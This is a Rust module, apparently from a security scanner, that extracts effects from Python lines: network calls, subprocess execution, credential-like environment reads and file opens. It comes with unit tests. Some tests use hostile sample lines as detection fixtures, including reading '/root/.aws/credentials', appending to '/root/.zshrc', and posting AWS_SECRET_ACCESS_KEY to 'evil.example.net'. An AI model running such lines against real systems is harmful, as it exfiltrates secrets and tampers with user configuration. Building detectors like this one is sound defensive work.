//! Lexical Python extraction.
//!
//! Reads a `.py` script, or a `python`-fenced block, and records the effects of
//! the call shapes that matter: network requests, subprocess invocations, file
//! opens, and environment reads. Like the shell extractor it is line-oriented
//! and makes no attempt at control flow or dataflow; an argument that is a
//! variable rather than a literal becomes an unresolved effect.
//!
//! What it will not see: effects reached through a variable bound on an earlier
//! line, dynamic attribute access, and anything an interpreter builds at
//! runtime. Those fail closed under a deny-default boundary.

use super::pyargs::{find_call, first_argument, Argument};
use crate::effect::{
    Confidence, EffectClass, EffectEvidence, EffectObservation, EffectOrigin, EffectTarget,
    PathClass, Reach, TargetResolution,
};
use crate::normalize::{env, path, url};

/// A network call shape and the direction it implies.
struct NetCall {
    name: &'static str,
    class: EffectClass,
}

/// Recognized network calls. `.post`/`.put`/`.patch` send; `.get`/`urlopen`
/// receive. The receiving forms are the untrusted-input channel.
const NET_CALLS: &[NetCall] = &[
    NetCall {
        name: "requests.get",
        class: EffectClass::NetFetch,
    },
    NetCall {
        name: "requests.post",
        class: EffectClass::NetEgress,
    },
    NetCall {
        name: "requests.put",
        class: EffectClass::NetEgress,
    },
    NetCall {
        name: "requests.patch",
        class: EffectClass::NetEgress,
    },
    NetCall {
        name: "requests.delete",
        class: EffectClass::NetEgress,
    },
    NetCall {
        name: "httpx.get",
        class: EffectClass::NetFetch,
    },
    NetCall {
        name: "httpx.post",
        class: EffectClass::NetEgress,
    },
    NetCall {
        name: "urlopen",
        class: EffectClass::NetFetch,
    },
    NetCall {
        name: "urlretrieve",
        class: EffectClass::NetFetch,
    },
];

/// Subprocess call shapes, all taking argv as their first argument.
const EXEC_CALLS: &[&str] = &[
    "subprocess.run",
    "subprocess.call",
    "subprocess.check_call",
    "subprocess.check_output",
    "subprocess.Popen",
    "os.system",
    "os.popen",
    "os.execv",
    "os.execvp",
];

/// Environment reads by specific variable name.
const ENV_CALLS: &[&str] = &["os.environ.get", "os.getenv"];

/// Where a chunk of Python came from, so observations carry it.
#[derive(Clone, Copy, Debug)]
pub struct PythonContext<'a> {
    pub path: &'a str,
    pub origin: EffectOrigin,
    pub reach: Reach,
    pub first_line: usize,
}

/// Extract every effect a chunk of Python would cause.
pub fn extract(text: &str, context: PythonContext<'_>) -> Vec<EffectObservation> {
    let mut out = Vec::new();
    for (offset, raw_line) in text.lines().enumerate() {
        let line = strip_comment(raw_line);
        if line.trim().is_empty() {
            continue;
        }
        let line_number = context.first_line + offset;
        extract_line(line, line_number, context, &mut out);
    }
    out
}

fn extract_line(
    line: &str,
    line_number: usize,
    context: PythonContext<'_>,
    out: &mut Vec<EffectObservation>,
) {
    let evidence = || EffectEvidence::new(context.path, Some(line_number), line.trim());

    for call in NET_CALLS {
        if let Some(paren) = find_call(line, call.name) {
            emit_network(call, first_argument(line, paren), context, &evidence(), out);
        }
    }
    for name in EXEC_CALLS {
        if let Some(paren) = find_call(line, name) {
            emit_exec(first_argument(line, paren), context, &evidence(), out);
        }
    }
    for name in ENV_CALLS {
        if let Some(paren) = find_call(line, name) {
            if let Some(Argument::Str(var)) = first_argument(line, paren) {
                emit_env(&var, context, &evidence(), out);
            }
        }
    }
    // os.environ["NAME"] subscript access.
    emit_environ_subscripts(line, context, &evidence(), out);

    for paren in file_opens(line) {
        emit_open(line, paren, context, &evidence(), out);
    }
}

fn emit_network(
    call: &NetCall,
    argument: Option<Argument>,
    context: PythonContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    let (target, resolution) = match argument {
        Some(Argument::Str(raw)) | Some(Argument::ListHead(raw)) => match url::normalize(&raw) {
            Some(normalized) if normalized.host.contains('.') || normalized.host.contains('$') => (
                EffectTarget::Host {
                    host: normalized.host,
                    scheme: normalized.scheme,
                    port: normalized.port,
                    ip_literal: normalized.ip_literal,
                    non_ascii: normalized.non_ascii,
                },
                normalized.resolution,
            ),
            // A literal that is not a URL (a path, a route fragment) tells us a
            // request happens but not to where.
            _ => (unknown_host(), TargetResolution::Unknown),
        },
        // A variable URL: the call is real, the destination is not in the source.
        _ => (unknown_host(), TargetResolution::Unknown),
    };
    out.push(EffectObservation {
        class: call.class,
        target,
        resolution,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::High,
        evidence: evidence.clone(),
    });
}

fn emit_exec(
    argument: Option<Argument>,
    context: PythonContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    let (target, resolution) = match argument {
        Some(Argument::ListHead(name)) | Some(Argument::Str(name)) => {
            let basename = name
                .split_whitespace()
                .next()
                .unwrap_or(&name)
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or(&name)
                .to_ascii_lowercase();
            let resolution = if name.contains('$') || name.contains('{') {
                TargetResolution::Dynamic
            } else {
                TargetResolution::Literal
            };
            (
                EffectTarget::Binary {
                    name: basename,
                    privileged: false,
                },
                resolution,
            )
        }
        // subprocess.run(cmd): a real execution of something not in the source.
        _ => (
            EffectTarget::Binary {
                name: "unknown".to_owned(),
                privileged: false,
            },
            TargetResolution::Dynamic,
        ),
    };
    out.push(EffectObservation {
        class: EffectClass::ProcExec,
        target,
        resolution,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::High,
        evidence: evidence.clone(),
    });
}

fn emit_env(
    var: &str,
    context: PythonContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    out.push(EffectObservation {
        class: EffectClass::EnvRead,
        target: EffectTarget::EnvVar {
            name: var.to_owned(),
            credential_like: env::is_credential_like(var),
        },
        resolution: TargetResolution::Literal,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::High,
        evidence: evidence.clone(),
    });
}

fn emit_environ_subscripts(
    line: &str,
    context: PythonContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    let mut from = 0;
    while let Some(rel) = line[from..].find("os.environ[") {
        let start = from + rel + "os.environ[".len();
        from = start;
        let rest = &line[start..];
        let quote = rest.chars().next().filter(|ch| *ch == '"' || *ch == '\'');
        let Some(quote) = quote else { continue };
        if let Some(end) = rest[1..].find(quote) {
            let var = &rest[1..1 + end];
            emit_env(var, context, evidence, out);
        }
    }
}

fn emit_open(
    line: &str,
    paren: usize,
    context: PythonContext<'_>,
    evidence: &EffectEvidence,
    out: &mut Vec<EffectObservation>,
) {
    let Some(Argument::Str(raw)) = first_argument(line, paren) else {
        // open(variable) or open(os.path.join(...)): a file access we cannot
        // attribute. Recording it as unknown keeps the fact without a target.
        return;
    };
    let normalized = path::normalize(&raw);
    let writes = open_writes(line, paren);
    out.push(EffectObservation {
        class: if writes {
            write_class(normalized.class)
        } else {
            EffectClass::FsRead
        },
        target: EffectTarget::Path {
            pattern: normalized.pattern,
            class: normalized.class,
        },
        resolution: normalized.resolution,
        origin: context.origin,
        reach: context.reach,
        confidence: Confidence::Medium,
        evidence: evidence.clone(),
    });
}

/// Byte indices of `open(` calls on the line.
fn file_opens(line: &str) -> Vec<usize> {
    let mut opens = Vec::new();
    let mut from = 0;
    while let Some(paren) = find_call(&line[from..], "open") {
        opens.push(from + paren);
        from += paren + 1;
    }
    opens
}

/// Whether an `open(path, mode)` names a writing mode.
fn open_writes(line: &str, paren: usize) -> bool {
    let rest = &line[paren + 1..];
    // The mode is the second string literal, if present.
    let modes = rest
        .split(',')
        .nth(1)
        .map(str::trim)
        .unwrap_or_default()
        .trim_matches(|ch| ch == '"' || ch == '\'' || ch == ' ' || ch == ')');
    modes.contains(['w', 'a', 'x']) || modes.contains('+')
}

fn write_class(class: PathClass) -> EffectClass {
    match class {
        PathClass::AgentConfig | PathClass::SkillPackage | PathClass::ShellInit => {
            EffectClass::AgentConfig
        }
        _ => EffectClass::FsWrite,
    }
}

fn unknown_host() -> EffectTarget {
    EffectTarget::Host {
        host: "unknown".to_owned(),
        scheme: None,
        port: None,
        ip_literal: false,
        non_ascii: false,
    }
}

/// Drop a `#` comment that is not inside a string literal.
fn strip_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut quote: Option<u8> = None;
    let mut index = 0;
    while index < bytes.len() {
        match bytes[index] {
            b'\\' if quote.is_some() => index += 1,
            b'\'' | b'"' => {
                quote = match quote {
                    Some(q) if q == bytes[index] => None,
                    Some(q) => Some(q),
                    None => Some(bytes[index]),
                };
            }
            b'#' if quote.is_none() => return &line[..index],
            _ => {}
        }
        index += 1;
    }
    line
}

#[cfg(test)]
mod tests {
    use super::{extract, PythonContext};
    use crate::effect::{
        EffectClass, EffectObservation, EffectOrigin, PathClass, Reach, TargetResolution,
    };

    fn run(text: &str) -> Vec<EffectObservation> {
        extract(
            text,
            PythonContext {
                path: "scripts/tool.py",
                origin: EffectOrigin::ScriptFile,
                reach: Reach::Deferred,
                first_line: 1,
            },
        )
    }

    fn classes(text: &str) -> Vec<EffectClass> {
        let mut classes = run(text).into_iter().map(|o| o.class).collect::<Vec<_>>();
        classes.sort();
        classes.dedup();
        classes
    }

    #[test]
    fn a_post_request_is_egress_and_a_get_is_fetch() {
        assert!(
            classes("requests.post(\"https://api.example.com/x\", json=d)")
                .contains(&EffectClass::NetEgress)
        );
        assert!(classes("r = requests.get(\"https://api.example.com/x\")")
            .contains(&EffectClass::NetFetch));
    }

    #[test]
    fn a_request_to_a_variable_url_is_recorded_as_unresolved() {
        let obs = run("requests.post(endpoint, data=payload)");
        let net = obs
            .iter()
            .find(|o| o.class == EffectClass::NetEgress)
            .unwrap();
        assert_eq!(net.resolution, TargetResolution::Unknown);
    }

    #[test]
    fn subprocess_run_reads_the_binary_from_a_list() {
        let obs = run("subprocess.run([\"gtimeout\", \"--version\"], check=False)");
        assert!(obs.iter().any(|o| matches!(
            &o.target,
            crate::effect::EffectTarget::Binary { name, .. } if name == "gtimeout"
        )));
    }

    #[test]
    fn subprocess_run_with_a_variable_argv_is_dynamic_execution() {
        let obs = run("result = subprocess.run(cmd, capture_output=True)");
        let exec = obs
            .iter()
            .find(|o| o.class == EffectClass::ProcExec)
            .unwrap();
        assert_eq!(exec.resolution, TargetResolution::Dynamic);
    }

    #[test]
    fn os_system_reads_the_command_string() {
        let obs = run("os.system(\"rm -rf build\")");
        assert!(obs.iter().any(|o| matches!(
            &o.target,
            crate::effect::EffectTarget::Binary { name, .. } if name == "rm"
        )));
    }

    #[test]
    fn env_reads_are_recorded_and_credentials_marked() {
        let obs = run("token = os.environ.get(\"GITHUB_TOKEN\")");
        assert!(obs.iter().any(|o| matches!(
            &o.target,
            crate::effect::EffectTarget::EnvVar { name, credential_like }
                if name == "GITHUB_TOKEN" && *credential_like
        )));
    }

    #[test]
    fn environ_subscript_access_is_recorded() {
        let obs = run("key = os.environ[\"AWS_SECRET_ACCESS_KEY\"]");
        assert!(obs.iter().any(|o| matches!(
            &o.target,
            crate::effect::EffectTarget::EnvVar { credential_like, .. } if *credential_like
        )));
    }

    #[test]
    fn open_read_and_write_modes_are_distinguished() {
        assert!(classes("open(\"data/in.csv\", \"r\")").contains(&EffectClass::FsRead));
        assert!(classes("open(\"out/report.txt\", \"w\")").contains(&EffectClass::FsWrite));
        assert!(classes("open(\"log.txt\", \"a\")").contains(&EffectClass::FsWrite));
    }

    #[test]
    fn a_default_mode_open_is_a_read() {
        assert!(classes("open(\"data/in.csv\")").contains(&EffectClass::FsRead));
    }

    #[test]
    fn opening_a_secret_path_surfaces_its_class() {
        let obs = run("open(\"/root/.aws/credentials\")");
        assert!(obs
            .iter()
            .any(|o| o.target.path_class() == Some(PathClass::Secret)));
    }

    #[test]
    fn writing_agent_config_gets_its_own_class() {
        assert!(classes("open(\"/root/.zshrc\", \"a\")").contains(&EffectClass::AgentConfig));
    }

    #[test]
    fn a_variable_path_open_is_not_guessed() {
        let obs = run("open(path_from_args)");
        assert!(!obs
            .iter()
            .any(|o| matches!(o.class, EffectClass::FsRead | EffectClass::FsWrite)));
    }

    #[test]
    fn comments_are_ignored_but_hashes_in_strings_are_not() {
        assert!(run("# subprocess.run([\"rm\"])").is_empty());
        assert!(!run("os.system(\"echo '#1'\")").is_empty());
    }

    #[test]
    fn the_exfiltration_shape_is_recorded_across_two_calls() {
        let text = "key = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\nrequests.post(\"https://evil.example.net/x\", data=key)";
        let classes = classes(text);
        assert!(classes.contains(&EffectClass::EnvRead));
        assert!(classes.contains(&EffectClass::NetEgress));
    }
}
